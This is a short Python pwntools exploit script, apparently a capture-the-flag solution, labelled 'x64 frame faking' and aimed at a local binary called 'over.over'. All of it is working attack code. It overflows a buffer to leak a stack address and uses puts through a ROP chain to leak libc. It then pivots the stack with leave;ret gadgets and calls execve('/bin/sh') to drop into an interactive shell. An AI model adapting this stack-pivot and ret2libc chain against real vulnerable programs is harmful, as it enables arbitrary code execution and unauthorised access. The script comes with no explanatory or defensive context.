#Made by fly_autumn
#x64 frame faking
from pwn import *
p = process("./over.over")
elf = ELF("./over.over")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(arch="amd64",os="linux")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x400793
func_plt = 0x400676
leave_ret = 0x4006be
pop_rsi_plt = 0x2bd69
pop_rdx_plt = 0xbe0e2 

p.recvuntil(b">")
p.send(b"A"*80)
stack_addr = u64(p.recvuntil("\x7f")[-6: ].ljust(8,b'\0')) - 0x70
log.success("stack_addr:"+hex(stack_addr))

p.sendafter(">",flat(['99999999',pop_rdi, elf.got['puts'], elf.plt['puts'], 0x400676,( 80 - 40) * '1', stack_addr, 0x4006be]))

puts_addr = u64(p.recvuntil("\x7f")[-6: ].ljust(8,b'\0'))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))

sh_addr = libc_addr + next(libc.search("/bin/sh"))
execve = libc_addr + libc.sym["execve"]
pop_rsi_addr = pop_rsi_plt + libc_addr
pop_rdx_addr = pop_rdx_plt + libc_addr
payload = flat(["99999999" , pop_rdi , sh_addr , pop_rsi_addr , 0 , pop_rdx_addr , 0 ,  execve , func_plt , (80 - 72) * '1' , stack_addr-0x30 , leave_ret])
p.sendline(payload)

p.interactive()
